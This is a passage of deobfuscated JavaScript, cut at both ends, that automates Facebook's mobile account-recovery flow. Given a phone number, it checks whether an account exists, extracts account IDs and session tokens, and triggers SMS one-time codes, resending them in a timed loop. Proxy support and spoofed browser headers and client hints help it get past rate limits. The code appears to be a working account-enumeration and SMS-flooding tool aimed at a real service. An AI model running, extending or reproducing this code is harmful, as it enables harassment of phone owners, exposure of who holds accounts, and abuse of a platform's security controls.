  } else mfbLog("SEARCH", "cuid: NOT FOUND (likely multi-account)");
  const v954 = v949.includes("SelectAccountController");
  mfbLog("SEARCH", "multi-account: " + v954);
  const v955 = {};
  return v955.ok = true, v955.isMulti = v954, v955;
}
async function mfbSelectAccount(v965, v966, v967, v968) {
  mfbLog("SELECT_ACCT", "Fetching account list (select_account)...");
  const v969 = {};
  v969.lois_token = '';
  const v970 = {};
  v970.lois_settings = v969, v970.aac = '';
  const v971 = {
    'server_params': {
      'device_id': v965.datr || '',
      'waterfall_id': v965.waterfall || uuid(),
      'is_platform_login': 0x0,
      'is_from_logged_out': 0x0,
      'access_flow_version': "pre_mt_behavior",
      'login_surface': "account_recovery",
      'login_entry_point': "account_recovery",
      'context_data': v965.contextData || null,
      'back_nav_action': "BACK",
      'INTERNAL_INFRA_screen_id': "CAA_ACCOUNT_RECOVERY_SELECT_ACCOUNT"
    },
    'client_input_params': v970
  };
  const v972 = await mfbBloksPost("com.bloks.www.caa.ar.select_account", "app", v971, v965, v966, v967, v968);
  if (!v972) {
    mfbLog("SELECT_ACCT", "FAILED: no response");
    const v977 = {};
    return v977.ok = false, v977;
  }
  mfbLog("SELECT_ACCT", "HTTP " + v972.status + " | " + v972.raw.length + " bytes | rid=" + (mfbExtractRid(v972.parsed) || "n/a")), mfbSaveRaw("SELECT_ACCOUNT", v972.raw);
  if (v972.status >= 0x1f4) {
    mfbLog("SELECT_ACCT", "HTTP " + v972.status + " — aborting flow (session not established)");
    const v978 = {};
    return v978.ok = false, v978.error = "select_acct_500", v978;
  }
  const v973 = v972.raw,
    v974 = v973.includes("xhp_bk__caa__error_message_screen") || v973.includes("error_message_screen");
  if (v974) {
    mfbLog("SELECT_ACCT", "Error screen returned — aborting flow");
    const v979 = {};
    return v979.ok = false, v979.error = "select_acct_error_screen", v979;
  }
  let v975 = 0x0;
  while (!v965.cuid) {
    const v980 = v973.indexOf("\"AY", v975);
    if (v980 === -1) break;
    let v981 = v980 + 0x1;
    while (v981 < v973.length && /[A-Za-z0-9_\-]/.test(v973[v981])) v981++;
    const v982 = v973.slice(v980 + 0x1, v981);
    if (v982.length > 0x96) {
      const v983 = v973.slice(v981, v981 + 0xc8);
      if (v983.includes("\"data\"") || v983.includes("contactpoints")) {
        v965.cuid = v982;
        break;
      }
      if (!v965.cuid) v965.cuid = v982;
    }
    v975 = v980 + 0x1;
  }
  if (v965.cuid) mfbLog("SELECT_ACCT", "cuid: " + v965.cuid.slice(0x0, 0x32) + "... (len=" + v965.cuid.length + ')');else mfbLog("SELECT_ACCT", "cuid: NOT FOUND");
  const v976 = {};
  return v976.ok = true, v976;
}
async function mfbSelectAccountAsync(v984, v985, v986, v987) {
  const v988 = {};
  v988.ok = false;
  if (!v984.cuid) return v988;
  mfbLog("SEL_ACCT_ASYNC", "Tapping account cuid=" + v984.cuid.slice(0x0, 0x1e) + "...");
  const v989 = {};
  v989.data = [];
  const v990 = {};
  v990.is_eligible_for_oauth = 0x0, v990.oauth_eligible_email = null;
  const v991 = {};
  v991.sso_token = null, v991.is_eligible_for_msgr_sso = 0x0, v991.is_eligible_for_sso = 0x0, v991.app_source = null, v991.login_type = "FB_SSO";
  const v992 = {};
  v992.is_unvetted_challenge_required = 0x1, v992.can_bypass_timing_signal_timestamp_value = 0x0;
  v992.is_unvetted_lookup_type_challenge_passed = 0x0;
  const v993 = {};
  v993.is_eligible_for_sowa = 0x1, v993.is_whatsapp_installed = 0x0, v993.unvetted_challenge_requirement = v992;
  const v994 = {};
  v994.is_eligible_for_flash_call = 0x0, v994.flash_call_permissions_status = null, v994.sim_state = null;
  const v995 = {};
  v995.name = '', v995.profile_pic_url = '', v995.cuid = v984.cuid, v995.contactpoints = v989, v995.oauth_data = v990, v995.foa_sso_data = v991, v995.fdr_nonce = null, v995.identifier_source = null, v995.is_from_auto_search = 0x0, v995.is_shared_phone_taker = 0x0, v995.should_send_cp_nonce = 0x0, v995.shared_phone_number = null, v995.sowa_data = v993, v995.flash_call_data = v994, v995.assistive_id_flow = "none", v995.joinyear = 0x7e2, v995.lara_auth_method = null, v995.lara_sequence_data = null, v995.lara_decision_was_boosted = 0x0;
  const v996 = v995,
    v997 = {
      'server_params': {
        'device_id': v984.datr || '',
        'waterfall_id': v984.waterfall || uuid(),
        'is_platform_login': 0x0,
        'is_from_logged_out': 0x0,
        'access_flow_version': "pre_mt_behavior",
        'login_surface': "account_recovery",
        'login_entry_point': "account_recovery",
        'context_data': v984.contextData || null,
        'back_nav_action': "BACK"
      },
      'client_input_params': {
        'fb_selected_account': v996,
        'waterfall_id': v984.waterfall || uuid()
      }
    },
    v998 = await mfbBloksPost("com.bloks.www.caa.ar.select_account.async", "action", v997, v984, v985, v986, v987);
  if (!v998) {
    mfbLog("SEL_ACCT_ASYNC", "FAILED: no response");
    const v1002 = {};
    return v1002.ok = false, v1002;
  }
  mfbLog("SEL_ACCT_ASYNC", "HTTP " + v998.status + " | " + v998.raw.length + " bytes | rid=" + (mfbExtractRid(v998.parsed) || "n/a"));
  mfbSaveRaw("SELECT_ACCOUNT_ASYNC", v998.raw);
  const v999 = v998.raw,
    v1000 = v999.indexOf("\"account_recovery\", \"account_recovery\", \"");
  if (v1000 > -1) {
    const v1003 = v1000 + "\"account_recovery\", \"account_recovery\", \"".length,
      v1004 = v999.indexOf('\x22', v1003);
    v1004 > v1003 && (v984.contextData = v999.slice(v1003, v1004), mfbLog("SEL_ACCT_ASYNC", "context_data updated: " + v984.contextData.slice(0x0, 0x3c) + "..."));
  } else mfbLog("SEL_ACCT_ASYNC", "context_data: not updated");
  const v1001 = {};
  return v1001.ok = true, v1001;
}
async function mfbAuthMethod(v1005, v1006, v1007, v1008) {
  mfbLog("AUTH_METHOD", "Fetching auth_method screen...");
  const v1009 = {};
  v1009.lois_token = '';
  const v1010 = {};
  v1010.lois_settings = v1009;
  v1010.aac = '';
  const v1011 = {
      'server_params': {
        'device_id': v1005.datr || '',
        'waterfall_id': v1005.waterfall || uuid(),
        'is_platform_login': 0x0,
        'is_from_logged_out': 0x0,
        'access_flow_version': "pre_mt_behavior",
        'login_surface': "account_recovery",
        'login_entry_point': "account_recovery",
        'cuid': v1005.cuid || null,
        'context_data': v1005.contextData || null,
        'back_nav_action': "BACK",
        'INTERNAL_INFRA_screen_id': "CAA_ACCOUNT_RECOVERY_AUTH_METHOD"
      },
      'client_input_params': v1010
    },
    v1012 = await mfbBloksPost("com.bloks.www.caa.ar.auth_method.async", "action", v1011, v1005, v1006, v1007, v1008);
  if (!v1012) {
    mfbLog("AUTH_METHOD", "FAILED: no response");
    const v1016 = {};
    return v1016.ok = false, v1016;
  }
  mfbLog("AUTH_METHOD", "HTTP " + v1012.status + " | " + v1012.raw.length + " bytes | rid=" + (mfbExtractRid(v1012.parsed) || "n/a")), mfbSaveRaw("AUTH_METHOD", v1012.raw);
  const v1013 = v1012.raw,
    v1014 = v1013.indexOf("\"account_recovery\", \"account_recovery\", \"");
  if (v1014 > -1) {
    const v1017 = v1014 + "\"account_recovery\", \"account_recovery\", \"".length,
      v1018 = v1013.indexOf('\x22', v1017);
    v1018 > v1017 && (v1005.contextData = v1013.slice(v1017, v1018), mfbLog("AUTH_METHOD", "context_data updated: " + v1005.contextData.slice(0x0, 0x3c) + "..."));
  } else mfbLog("AUTH_METHOD", "context_data: not updated");
  const v1015 = {};
  v1015.ok = true;
  return v1015;
}
async function mfbInitiateView(v1019, v1020, v1021, v1022) {
  mfbLog("INITIATE", "Sending initiate_view...");
  const v1023 = {};
  v1023.lois_token = '';
  const v1024 = {};
  v1024.lois_settings = v1023, v1024.aac = '';
  const v1025 = {
      'server_params': {
        'device_id': v1019.datr || '',
        'waterfall_id': v1019.waterfall || uuid(),
        'is_platform_login': 0x0,
        'is_from_logged_out': 0x0,
        'access_flow_version': "pre_mt_behavior",
        'login_surface': "account_recovery",
        'login_entry_point': "account_recovery",
        'cuid': v1019.cuid || null,
        'context_data': v1019.contextData || null,
        'back_nav_action': "BACK",
        'INTERNAL_INFRA_screen_id': "CAA_ACCOUNT_RECOVERY_INITIATE_VIEW"
      },
      'client_input_params': v1024
    },
    v1026 = await mfbBloksPost("com.bloks.www.caa.ar.initiate_view.async", "app", v1025, v1019, v1020, v1021, v1022);
  if (!v1026) {
    mfbLog("INITIATE", "FAILED: no response");
    const v1032 = {};
    return v1032.ok = false, v1032;
  }
  mfbLog("INITIATE", "HTTP " + v1026.status + " | " + v1026.raw.length + " bytes | rid=" + (mfbExtractRid(v1026.parsed) || "n/a"));
  mfbSaveRaw("INITIATE_VIEW", v1026.raw);
  const v1027 = v1026.raw;
  const v1028 = v1027.indexOf("\"serialized_states\", \"{");
  if (v1028 > -1) {
    const v1033 = v1028 + "\"serialized_states\", \"".length,
      v1034 = v1027.indexOf('\x22', v1033);
    v1034 > v1033 && (v1019.serializedStates = v1027.slice(v1033, v1034), mfbLog("INITIATE", "serialized_states: extracted"));
  } else mfbLog("INITIATE", "serialized_states: not found (using default)");
  const v1029 = v1027.includes("SmsCaptcha") || v1027.includes("sms_captcha"),
    v1030 = v1027.includes("ar_context_exception");
  mfbLog("INITIATE", "captcha=" + v1029 + " ar_context_err=" + v1030);
  const v1031 = {};
  return v1031.ok = true, v1031.hasCaptcha = v1029, v1031;
}
async function mfbSendOTP(v1035, v1036, v1037, v1038) {
  mfbLog("OTP_SEND", "Triggering auth_option_selection (auth_option=phone)...");
  const v1039 = v1035.serializedStates || "{\"is_loading\":\"2;1fw3nyla0x;0\"}",
    v1040 = {};
  v1040.lois_token = '';
  const v1041 = {
    'server_params': {
      'device_id': v1035.datr || '',
      'waterfall_id': v1035.waterfall || uuid(),
      'login_type': "FB_SSO",
      'auth_options': ["whatsapp", "phone", "password"],
      'is_platform_login': 0x0,
      'is_from_logged_in_switcher': 0x0,
      'is_from_logged_out': 0x0,
      'access_flow_version': "pre_mt_behavior",
      'login_surface': "account_recovery",
      'login_entry_point': "account_recovery",
      'cuid': v1035.cuid || null,
      'context_data': v1035.contextData || null,
      'serialized_states': v1039,
      'back_nav_action': "BACK",
      'INTERNAL_INFRA_screen_id': "CAA_ACCOUNT_RECOVERY_INITIATE_VIEW"
    },
    'client_input_params': {
      'family_device_id': '',
      'machine_id': '',
      'zero_balance_state': '',
      'auth_option': "phone",
      'android_build_type': '',
      'selected_phone_number_index': null,
      'selected_xapp_contactpoint_index': 0x0,
      'selected_encrypted_bloks_xapp_cp_lookup_data': '',
      'cloud_trust_token': null,
      'network_bssid': null,
      'lois_settings': v1040,
      'aac': ''
    }
  };
  const v1042 = await mfbBloksPost("com.bloks.www.caa.ar.auth_option_selection.async", "action", v1041, v1035, v1036, v1037, v1038);
  if (!v1042) {
    mfbLog("OTP_SEND", "FAILED: no response");
    const v1048 = {};
    return v1048.ok = false, v1048.error = "no_response", v1048;
  }
  mfbLog("OTP_SEND", "HTTP " + v1042.status + " | " + v1042.raw.length + " bytes | rid=" + (mfbExtractRid(v1042.parsed) || "n/a")), mfbSaveRaw("OTP_SEND", v1042.raw);
  const v1043 = v1042.raw,
    v1044 = v1043.includes("code_entry") || v1043.includes("initiate_view_code_send_success") || v1043.includes("CAA_ACCOUNT_RECOVERY_CODE_ENTRY"),
    v1045 = v1043.includes("SmsCaptcha") || v1043.includes("sms_captcha"),
    v1046 = v1043.includes("ar_context_exception") || v1043.includes("xhp_bk__caa__error_message_screen") || v1043.includes("error_message_screen") || v1043.includes("identifier_error_dialog");
  mfbLog("OTP_SEND", "code_entry=" + v1044 + "  SmsCaptcha=" + v1045 + "  error=" + v1046);
  if (v1044) {
    mfbLog("OTP_SEND", "SUCCESS: OTP sent (code_entry confirmed)");
    const v1049 = {};
    return v1049.ok = true, v1049.hasCaptcha = false, v1049;
  }
  if (v1045) {
    mfbLog("OTP_SEND", "SUCCESS: OTP triggered (SmsCaptcha challenge shown)");
    const v1050 = {};
    return v1050.ok = true, v1050.hasCaptcha = true, v1050;
  }
  mfbLog("OTP_SEND", "FAIL: FB did not return code_entry or SmsCaptcha (silent reject / rate limit)");
  const v1047 = {};
  return v1047.ok = false, v1047.error = v1046 ? "ar_context_exception" : "otp_not_dispatched", v1047;
}
async function processNumberMobile(v1051, v1052, v1053, v1054, v1055 = 0x0) {
  const v1056 = v1051.startsWith('+') ? v1051 : '+' + v1051;
  if (MFB_DEBUG_ENABLED) try {
    fs.appendFileSync(MFB_DEBUG_LOG, '\x0a' + '='.repeat(0x3c) + '\x0a[' + new Date().toISOString() + "] m.facebook.com Bloks — " + v1056 + '\x0a' + '='.repeat(0x3c) + '\x0a');
  } catch (v1057) {}
  mfbLog("FLOW", "Starting m.facebook.com Bloks OTP for " + v1056);
  try {
    const v1058 = await mfbBootstrap(v1052, v1053, v1054);
    if (!v1058.fb_dtsg && !v1058.lsd) {
      mfbLog("FLOW", "ABORT: Bootstrap returned no tokens");
      const v1063 = {};
      return v1063.ok = false, v1063.error = "bootstrap_fail", v1063;
    }
    const v1059 = await mfbSearch(v1056, v1058, v1052, v1053, v1054);
    if (!v1059.ok) {
      mfbLog("FLOW", "ABORT: Search failed");
      const v1064 = {};
      return v1064.ok = false, v1064.error = v1059.error || (v1059.notFound ? "not_found" : "search_fail"), v1064;
    }
    if (!v1058.cuid) {
      mfbLog("FLOW", "No cuid — entering select_account (multi-account path)");
      const v1065 = await mfbSelectAccount(v1058, v1052, v1053, v1054);
      if (!v1065.ok) {
        mfbLog("FLOW", "ABORT: select_account failed (" + (v1065.error || "unknown") + ')');
        const v1066 = {};
        return v1066.ok = false, v1066.error = v1065.error || "select_acct_fail", v1066;
      }
      v1058.cuid ? await mfbSelectAccountAsync(v1058, v1052, v1053, v1054) : mfbLog("FLOW", "No cuid found after select_account — continuing without");
    }
    await mfbAuthMethod(v1058, v1052, v1053, v1054);
    const v1060 = await mfbInitiateView(v1058, v1052, v1053, v1054);
    if (!v1060.ok) {
      mfbLog("FLOW", "ABORT: InitiateView failed");
      const v1067 = {};
      return v1067.ok = false, v1067.error = "initiate_fail", v1067;
    }
    const v1061 = await mfbSendOTP(v1058, v1052, v1053, v1054);
    if (!v1061.ok) {
      mfbLog("FLOW", "ABORT: SendOTP failed: " + v1061.error);
      const v1068 = {};
      return v1068.ok = false, v1068.error = v1061.error || "otp_send_fail", v1068;
    }
    for (let v1069 = 0x0; v1069 < v1055; v1069++) {
      await sleep(0x1388), await mfbSendOTP(v1058, v1052, v1053, v1054);
    }
    mfbLog("SESSION", "cuid        : " + (v1058.cuid ? v1058.cuid.slice(0x0, 0x28) + "..." : "(none)")), mfbLog("SESSION", "contextData : " + (v1058.contextData ? v1058.contextData.slice(0x0, 0x28) + "..." : "(none)")), mfbLog("SESSION", "waterfall   : " + (v1058.waterfall || "(none)")), mfbLog("SESSION", "datr        : " + (v1058.datr ? v1058.datr.slice(0x0, 0x14) + "..." : "(none)")), mfbLog("SESSION", "fb_dtsg     : " + (v1058.fb_dtsg ? v1058.fb_dtsg.slice(0x0, 0x14) + "..." : "(none)")), mfbLog("FLOW", "SUCCESS " + v1056 + (v1061.hasCaptcha ? " (SmsCaptcha)" : ''));
    const v1062 = {};
    return v1062.ok = true, v1062.hasCaptcha = v1061.hasCaptcha, v1062;
  } catch (v1070) {
    mfbLog("FLOW", "EXCEPTION: " + (v1070.stack || v1070.message));
    const v1071 = {};
    return v1071.ok = false, v1071.error = v1070.message, v1071;
  }
}
async function httpsGetPageWithRedirects(v1072, v1073, v1074 = 0x3a98, v1075 = "www.facebook.com", v1076 = null, v1077 = null, v1078 = null, v1079 = 0x5) {
  let v1080 = v1075 || "www.facebook.com",
    v1081 = v1072.startsWith("http") ? (() => {
      try {
        const v1087 = new URL(v1072);
        return v1080 = "www.facebook.com", v1087.pathname + v1087.search;
      } catch (v1088) {
        return v1072;
      }
    })() : v1072,
    v1082 = v1078 || "https://" + v1080 + "/login/identify/";
  const v1083 = {};
  (v1073 || '').split(';').forEach(v1089 => {
    const v1090 = v1089.indexOf('=');
    if (v1090 < 0x0) return;
    v1083[v1089.slice(0x0, v1090).trim()] = v1089.slice(v1090 + 0x1).trim();
  });
  let v1084 = null;
  for (let v1091 = 0x0; v1091 < v1079; v1091++) {
    const v1092 = Object.entries(v1083).map(([v1097, v1098]) => v1097 + '=' + v1098).join(';\x20'),
      v1093 = v1077 || globalUA,
      v1094 = {
        'Cookie': v1092,
        'User-Agent': v1093.userAgent,
        'Accept': "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
        'Accept-Language': v1077 && v1077.hostCtx ? v1077.hostCtx.lang : "en-US,en;q=0.9",
        'Accept-Encoding': "gzip, deflate, br",
        'Referer': v1082,
        'Upgrade-Insecure-Requests': '1',
        ...v1093.clientHints
      };
    v1094["sec-fetch-dest"] = "document", v1094["sec-fetch-mode"] = "navigate", v1094["sec-fetch-site"] = "same-origin", v1094["sec-fetch-user"] = '?1';
    const v1095 = v1094;
    if (v1076) {
      const v1099 = {};
      v1099.hostname = v1080, v1099.path = v1081, v1099.method = "GET", v1099.headers = v1095, v1084 = await proxyHttpsRequest(v1076, v1099, null, v1074);
    } else v1084 = await new Promise((v1100, v1101) => {
      const v1102 = {};
      v1102.hostname = v1080, v1102.port = 0x1bb;
      v1102.path = v1081, v1102.method = "GET";
      v1102.timeout = v1074, v1102.headers = v1095;
      const v1103 = v1102;
      const v1104 = https.request(v1103, v1105 => {
        const v1106 = [];
        v1105.on("data", v1107 => v1106.push(v1107)), v1105.on("end", () => {
          let v1108 = Buffer.concat(v1106);
          try {
            const v1109 = v1105.headers["content-encoding"];
            if (v1109 === "gzip") v1108 = zlib.gunzipSync(v1108);else {
              if (v1109 === "deflate") v1108 = zlib.inflateSync(v1108);else {
                if (v1109 === 'br') v1108 = zlib.brotliDecompressSync(v1108);
              }
            }
          } catch (v1110) {}
          v1100({
            'status': v1105.statusCode,
            'headers': v1105.headers,
            'data': v1108.toString(),
            'location': v1105.headers.location || ''
          });
        });
        v1105.on("error", v1101);
      });
      v1104.on("error", v1101);
      v1104.on("timeout", () => {
        v1104.destroy();
        v1101(new Error("GET timeout"));
      }), v1104.end();
    });
    const v1096 = v1084.headers && v1084.headers["set-cookie"];
    v1096 && (Array.isArray(v1096) ? v1096 : [v1096]).forEach(v1111 => {
      const v1112 = v1111.split(';')[0x0].split('=');
      if (v1112.length >= 0x2) {
        const v1113 = v1112[0x0].trim(),
          v1114 = v1112.slice(0x1).join('=').trim();
        if (v1114 !== "deleted" && !v1114.startsWith("deleted;")) v1083[v1113] = v1114;
      }
    });
    if ((v1084.status === 0x12d || v1084.status === 0x12e || v1084.status === 0x133) && v1084.location) {
      v1082 = "https://" + v1080 + v1081;
      let v1115 = v1084.location;
      if (v1115.startsWith("http")) try {
        const v1116 = new URL(v1115);
        v1080 = "www.facebook.com", v1081 = v1116.pathname + v1116.search;
      } catch (v1117) {
        v1081 = v1115;
      } else v1081 = v1115;
      cdbg("[GET REDIRECT] HTTP " + v1084.status + " -> " + v1080 + v1081.slice(0x0, 0x3c));
    } else break;
  }
  const v1085 = Object.entries(v1083).map(([v1118, v1119]) => v1118 + '=' + v1119).join(';\x20'),
    v1086 = {};
  v1086.status = v1084.status, v1086.headers = v1084.headers, v1086.data = v1084.data;
  v1086.cookieHeader = v1085, v1086.cookieMap = v1083;
  return v1086;
}
function parseResp(v1120) {
  v1120 = String(v1120).replace(/^for \(;;\);/, '');
  try {
    return JSON.parse(v1120);
  } catch (v1121) {
    return null;
  }
}
function mergeCookies(v1122, v1123) {
  if (!v1123) return;
  const v1124 = v1123["set-cookie"];
  if (!v1124) return;
  const v1125 = Array.isArray(v1124) ? v1124 : [v1124],
    v1126 = {};
  (v1122.cookieHeader || '').split(';').forEach(v1127 => {
    const v1128 = v1127.indexOf('=');
    if (v1128 < 0x0) return;
    v1126[v1127.slice(0x0, v1128).trim()] = v1127.slice(v1128 + 0x1).trim();
  }), v1125.forEach(v1129 => {
    const v1130 = v1129.split(';')[0x0].split('=');
    if (v1130.length >= 0x2) v1126[v1130[0x0].trim()] = v1130.slice(0x1).join('=').trim();
  }), v1122.cookieHeader = Object.entries(v1126).map(([v1131, v1132]) => v1131 + '=' + v1132).join(';\x20');
  dbg("[COOKIE MERGE] sfiu=" + (v1126.sfiu ? '✓' : '✗') + " keys=" + Object.keys(v1126).join(','));
}
async function searchAccount(v1133, v1134, v1135, v1136, v1137, v1138, v1139, v1140 = false) {
  const v1141 = uuid(),
    v1142 = uuid();
  if (SELECTED_BROWSER === "via_browser" && !v1140) {
    dbg("[SEARCH] Via Browser Mode: Executing m.facebook.com Bloks CAA Search for " + v1133);
    let v1156 = v1134.contextData || '';
    const fn21 = async (v1177, v1178, v1179, v1180 = {}) => {
      const v1181 = "/async/wbloks/fetch/?appid=" + v1177 + "&type=" + v1178 + "&__bkv=" + "8d7a099705c6918973f9eb638946ec70f8b902374eed3558006659bdf45d268b";
      const v1182 = {};
      v1182.server_params = v1179, v1182.client_input_params = v1180;
      const v1183 = JSON.stringify({
          'params': JSON.stringify(v1182)
        }),
        v1184 = new URLSearchParams();
      v1184.set("__aaid", '0'), v1184.set("__user", '0'), v1184.set("__a", '1');
      if (!v1134.__req) v1134.__req = 0xa;
      v1184.set("__req", (v1134.__req++).toString(0x10)), v1184.set("__hs", v1134.__hs || "20687.BP:wbloks_caa_pkg.2.0...0"), v1184.set("dpr", '3'), v1184.set("__ccg", "EXCELLENT"), v1184.set("__rev", v1134.rev || "1045798079"), v1184.set("__s", v1134.__s || ''), v1184.set("__hsi", v1134.hsi || String(Date.now())), v1184.set("__dyn", v1134.__dyn || '');
      v1184.set("fb_dtsg", v1134.fb_dtsg || '');
      let v1185 = "24976";
      if (v1134.fb_dtsg) {
        let v1187 = 0x0;
        for (let v1188 = 0x0; v1188 < v1134.fb_dtsg.length; v1188++) v1187 += v1134.fb_dtsg.charCodeAt(v1188);
        v1185 = '2' + v1187;
      }
      v1184.set("jazoest", v1134.jazoest || v1185), v1184.set("lsd", v1134.lsd || ''), v1184.set("params", v1183), dbg("[BLOKS CALL] " + v1177 + '\x20(' + v1178 + ')');
      const v1186 = await bloksPostPage(v1181, v1184.toString(), v1134.cookieHeader, 0x3a98, "m.facebook.com", v1135, v1136, "https://m.facebook.com/login/identify/");
      if (v1186.headers) mergeCookies(v1134, v1186.headers);
      return v1186;
    };
    if (!v1156) {
      dbg("[BLOKS INIT] Fetching initial context_data via initiate_view...");
      const v1189 = {};
      v1189.device_id = v1134.datr || "D8dsalb7sHwGphZmNCiTfW1G", v1189.waterfall_id = v1141, v1189.is_platform_login = 0x0, v1189.is_from_logged_out = 0x0, v1189.access_flow_version = "pre_mt_behavior", v1189.login_surface = "account_recovery", v1189.login_entry_point = "account_recovery", v1189.context_data = '';
      const v1190 = v1189,
        v1191 = {};
      v1191.lois_token = '';
      const v1192 = {};
      v1192.lois_settings = v1191, v1192.machine_id = '', v1192.zero_balance_state = '', v1192.aac = '';
      const v1193 = await fn21("com.bloks.www.caa.ar.initiate_view", "app", v1190, v1192);
      if (v1193 && v1193.data) {
        const v1194 = v1193.data.match(/"context_data"\s*:\s*"([^"]+)"/);
        v1194 && (v1156 = v1194[0x1], v1134.contextData = v1156, dbg("[BLOKS INIT] Extracted context_data: " + v1156.slice(0x0, 0x1e) + "..."));
      }
    }
    if (v1156) {
      dbg("[BLOKS AUTH METHOD] Navigating to phone search screen via auth_method...");
      const v1195 = {};
      v1195.device_id = v1134.datr || "D8dsalb7sHwGphZmNCiTfW1G", v1195.waterfall_id = v1141, v1195.is_platform_login = 0x0, v1195.is_from_logged_out = 0x0, v1195.access_flow_version = "pre_mt_behavior", v1195.login_surface = "account_recovery", v1195.login_entry_point = "account_recovery", v1195.context_data = v1156, v1195.back_nav_action = "BACK", v1195.INTERNAL_INFRA_screen_id = "7besuf:3";
      const v1196 = v1195,
        v1197 = {};
      v1197.lois_token = '';
      const v1198 = {};
      v1198.lois_settings = v1197, v1198.zero_balance_state = '', v1198.aac = '';
      const v1199 = await fn21("com.bloks.www.caa.ar.auth_method", "app", v1196, v1198);
      if (v1199 && v1199.data) {
        const v1200 = v1199.data.match(/"context_data"\s*:\s*"([^"]+)"/);
        v1200 && (v1156 = v1200[0x1], v1134.contextData = v1156, dbg("[BLOKS AUTH METHOD] Updated context_data from auth_method: " + v1156.slice(0x0, 0x1e) + "..."));
      }
    }
    const v1157 = {
        'event_request_id': v1142,
        'INTERNAL__latency_qpl_marker_id': 0x2301b43,
        'INTERNAL__latency_qpl_instance_id': String(Date.now()) + '00',
        'device_id': null,
        'family_device_id': null,
        'waterfall_id': v1141,
        'offline_experiment_group': null,
        'layered_homepage_experiment_group': null,
        'is_platform_login': 0x0,
        'is_from_logged_in_switcher': 0x0,
        'is_from_logged_out': 0x0,
        'access_flow_version': "pre_mt_behavior",
        'login_surface': "unknown",
        'context_data': v1156
      },
      v1158 = {};
    v1158.lois_token = '';
    const v1159 = {
      'zero_balance_state': null,
      'search_query': v1133,
      'fetched_email_list': [],
      'fetched_email_token_list': {},
      'sso_accounts_auth_data': [],
      'sfdid': '',
      'text_input_id': Math.random().toString(0x24).substring(0x2, 0x8) + ":55",
      'encrypted_msisdn': '',
      'headers_infra_flow_id': '',
      'was_headers_prefill_available': 0x0,
      'was_headers_prefill_used': 0x0,
      'ig_oauth_token': [],
      'android_build_type': '',
      'is_whatsapp_installed': 0x0,
      'device_network_info': null,
      'accounts_list': [],
      'is_oauth_without_permission': 0x0,
      'search_screen_type': "mobile",
      'ig_vetted_device_nonce': '',
      'gms_incoming_call_retriever_eligibility': "client_not_supported",
      'auth_secure_device_id': '',
      'blocked_uids': [],
      'cloud_trust_token': null,
      'network_bssid': null,
      'lois_settings': v1158,
      'aac': ''
    };
    dbg("[BLOKS SEARCH] Executing search.async query for " + v1133);
    const v1160 = await fn21("com.bloks.www.caa.ar.search.async", "action", v1157, v1159);
    dbg("[BLOKS SEARCH] HTTP " + v1160.status + " - Data Length: " + (v1160.data ? v1160.data.length : 0x0));
    if (v1160.status !== 0xc8 || !v1160.data) {
      const v1201 = {};
      return v1201.ok = false, v1201.error = "Bloks Search HTTP " + v1160.status, v1201;
    }
    const v1161 = v1160.data || '',
      v1162 = v1160.encoding || "unknown",
      v1163 = v1161.replace(/[^\x20-\x7E]/g, '');
    dbg("[BLOKS SEARCH RESP] encoding=" + v1162 + " len=" + v1161.length), dbg("[BLOKS RESP A] " + v1163.slice(0x0, 0x5dc));
    if (v1163.length > 0x5dc) dbg("[BLOKS RESP B] " + v1163.slice(0x5dc, 0xbb8));
    const v1164 = v1161.includes("caa_account_recovery_client_events_fb") && v1161.includes("caa_core_data_encrypted"),
      v1165 = v1161.includes("caa_acquisition_client_fb_event") || v1161.includes("No accounts match") || v1161.includes("no_account_found") || v1161.includes("ACCOUNT_NOT_FOUND");
    dbg("[BLOKS SEARCH] account_found=" + v1164 + " no_account=" + v1165 + " len=" + v1161.length);
    if (v1165 || !v1164) {
      dbg('+' + v1133 + " BLOKS SEARCH: no account");
      const v1202 = {};
      return v1202.ok = false, v1202.result = "no_account", v1202;
    }
    const v1166 = v1161.match(/"(Ad[A-Za-z0-9_\-+/]{50,}\|arm)"/);
    if (v1166) v1134.contextData = v1166[0x1], dbg("[BLOKS SEARCH] Extracted context_data from Bloks DSL: " + v1134.contextData.slice(0x0, 0x28) + "...");else {
      const v1203 = v1161.match(/"context_data"\s*:\s*"([^"]+)"/);
      v1203 && (v1134.contextData = v1203[0x1], dbg("[BLOKS SEARCH] Extracted context_data from JSON: " + v1134.contextData.slice(0x0, 0x28) + "..."));
    }
    if (!v1134.contextData) {
      dbg('+' + v1133 + " BLOKS SEARCH FAIL: no context_data in search response");
      const v1204 = {};
      return v1204.ok = false, v1204.result = "no_account", v1204;
    }
    let v1167 = v1161.match(/"u"\s*:\s*"?(\d{8,16})"?/) || v1161.match(/"user_id"\s*:\s*"?(\d{8,16})"?/) || v1161.match(/"account_id"\s*:\s*"?(\d{8,16})"?/) || v1161.match(/"fbid"\s*:\s*"?(\d{8,16})"?/) || v1161.match(/\\"user_id\\"\s*:\s*\\"?(\d{8,16})\\"?/) || v1161.match(/\b(615\d{11,13}|1000\d{10,12})\b/);
    v1167 && (v1134.accountUid = v1167[0x1], v1134.searchUid = v1167[0x1]);
    dbg("[BLOKS SEARCH] Account found! ctxData=" + v1134.contextData.slice(0x0, 0x28) + "... | uid=" + (v1134.accountUid || "unknown")), dbg("[BLOKS SEARCH] Executing auth_option_selection.async to select SMS OTP...");
    const v1168 = v1142 || v1134.eventRequestId || crypto.randomUUID(),
      v1169 = {};
    v1169.is_loading = "2;fow2myypt;0";
    const v1170 = {
        'device_id': v1134.datr || '',
        'event_request_id': v1168,
        'login_type': "FB_SSO",
        'auth_options': ["whatsapp", "phone", "password"],
        'lara_usage': 0x1,
        'INTERNAL__latency_qpl_marker_id': 0x2301b43,
        'INTERNAL__latency_qpl_instance_id': String(Date.now()) + "00103",
        'family_device_id': null,
        'waterfall_id': v1141,
        'offline_experiment_group': null,
        'layered_homepage_experiment_group': null,
        'is_platform_login': 0x0,
        'is_from_logged_in_switcher': 0x0,
        'is_from_logged_out': 0x0,
        'access_flow_version': "pre_mt_behavior",
        'login_surface': "account_recovery",
        'login_entry_point': "account_recovery",
        'context_data': v1134.contextData,
        'serialized_states': v1169
      },
      v1171 = {};
    v1171.lois_token = '';
    const v1172 = {};
